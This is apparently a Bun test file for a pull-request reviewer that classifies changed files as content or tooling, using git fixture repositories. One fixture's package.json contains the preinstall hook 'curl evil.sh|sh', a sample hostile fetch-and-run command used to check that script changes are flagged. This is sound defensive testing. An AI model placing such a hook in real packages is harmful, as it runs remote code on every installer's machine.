// Tooling-diff tests over real git fixtures.

import { afterAll, describe, expect, test } from "bun:test";
import { rmSync } from "node:fs";
import { computeToolingDiff, formatToolingDiff } from "../../src/review/tooling-diff.ts";
import { spawnGit } from "../../src/git-runner.ts";
import { makeFixtureRepo } from "./helpers/git-fixture.ts";

const tempDirsToClean: string[] = [];
afterAll(() => {
  for (const dir of tempDirsToClean) {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* fine */
    }
  }
});

describe("computeToolingDiff — content-only PR", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: "{}" },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
        { kind: "file", path: "vocab/pigments.yaml", content: "- name: base\n" },
      ],
    },
    head: {
      message: "content only",
      files: [
        { kind: "file", path: "docs/index.md", content: "# pr\n" },
        { kind: "file", path: "vocab/pigments.yaml", content: "- name: pr\n" },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  test("classifies every change as content — no tooling changes", async () => {
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, fixture.baseSha, fixture.headSha);
    expect(diff.tooling).toHaveLength(0);
    expect(diff.content.length).toBeGreaterThan(0);
    expect(formatToolingDiff(diff)).toBe("");
  });
});

describe("computeToolingDiff — tooling changed", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: '{"scripts":{}}' },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
      ],
    },
    head: {
      message: "PR tweaks scripts and edits a doc",
      files: [
        { kind: "file", path: "package.json", content: '{"scripts":{"preinstall":"curl evil.sh|sh"}}' },
        { kind: "file", path: "docs/index.md", content: "# pr\n" },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  test("tooling change surfaces on `.tooling`, content on `.content`", async () => {
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, fixture.baseSha, fixture.headSha);
    expect(diff.tooling).toHaveLength(1);
    expect(diff.tooling[0]?.kind).toBe("modify");
    if (diff.tooling[0]?.kind === "modify") {
      expect(diff.tooling[0].path).toBe("package.json");
      expect(diff.tooling[0].class).toBe("tooling");
    }
    expect(diff.content).toHaveLength(1);
    expect(formatToolingDiff(diff)).toContain("package.json");
  });
});

describe("computeToolingDiff — extension-under-content-prefix note", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [{ kind: "file", path: "docs/index.md", content: "# base\n" }],
    },
    head: {
      message: "PR adds docs/evil.js",
      files: [{ kind: "file", path: "docs/evil.js", content: "console.log('x')\n" }],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  test("under-content-prefix + wrong extension is TOOLING with the ext note", async () => {
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, fixture.baseSha, fixture.headSha);
    expect(diff.tooling).toHaveLength(1);
    const change = diff.tooling[0];
    expect(change?.class).toBe("tooling");
    if (change?.kind === "modify") {
      expect(change.path).toBe("docs/evil.js");
      expect(change.extNote).toContain("content allowlist");
    }
    // Diagnostic contains the note.
    expect(formatToolingDiff(diff)).toContain("(under content prefix");
  });
});

describe("computeToolingDiff — uses merge-base (stale PR is not refused for base-side churn)", () => {
  // Build a base with two commits: initial + a base-side edit to
  // package.json AFTER the PR forked. The PR itself changes ONLY a
  // content file. A base-tip diff would spuriously see package.json
  // as "tooling changed" (from PR's fork point), whereas the merge-
  // base diff sees only the content change.
  test("base-side churn after fork point is ignored", async () => {
    const { makeFixtureRepo } = await import("./helpers/git-fixture.ts");
    const fixture = await makeFixtureRepo({
      base: {
        message: "base v1",
        files: [
          { kind: "file", path: "package.json", content: '{"v":1}' },
          { kind: "file", path: "docs/x.md", content: "one\n" },
        ],
      },
      head: {
        // PR forks from base v1 (created off `pr` branch by
        // helper) — the head commit is the pr side's edit.
        message: "PR edits docs",
        files: [{ kind: "file", path: "docs/x.md", content: "two\n" }],
      },
    });
    tempDirsToClean.push(fixture.repoDir);
    // Now push a base-side commit on main (AFTER the fork). Uses
    // the real git binary through Bun.spawn — cheap since the
    // helper already initialised the repo.
    const proc = Bun.spawn(["git", "-C", fixture.repoDir, "add", "-A"], { stdout: "pipe", stderr: "pipe" });
    await proc.exited;
    void proc;
    const { writeFileSync } = await import("node:fs");
    writeFileSync(`${fixture.repoDir}/package.json`, '{"v":2}');
    for (const args of [
      ["add", "-A"],
      ["commit", "--allow-empty", "-m", "base v2"],
    ]) {
      const p = Bun.spawn(["git", "-C", fixture.repoDir, ...args], {
        stdout: "pipe",
        stderr: "pipe",
        env: {
          ...process.env,
          GIT_AUTHOR_NAME: "Test", GIT_AUTHOR_EMAIL: "t@t",
          GIT_COMMITTER_NAME: "Test", GIT_COMMITTER_EMAIL: "t@t",
          GIT_AUTHOR_DATE: "2026-01-02T00:00:00+0000",
          GIT_COMMITTER_DATE: "2026-01-02T00:00:00+0000",
        },
      });
      await p.exited;
    }
    const revParse = Bun.spawn(["git", "-C", fixture.repoDir, "rev-parse", "HEAD"], { stdout: "pipe", stderr: "pipe" });
    const newBase = (await new Response(revParse.stdout).text()).trim();
    await revParse.exited;
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, newBase, fixture.headSha);
    expect(diff.mergeBase).toBe(fixture.baseSha);
    // Only the PR's docs change surfaces — package.json is NOT
    // tooling here even though it differs from the base TIP.
    expect(diff.tooling).toHaveLength(0);
    expect(diff.content).toHaveLength(1);
  });
});
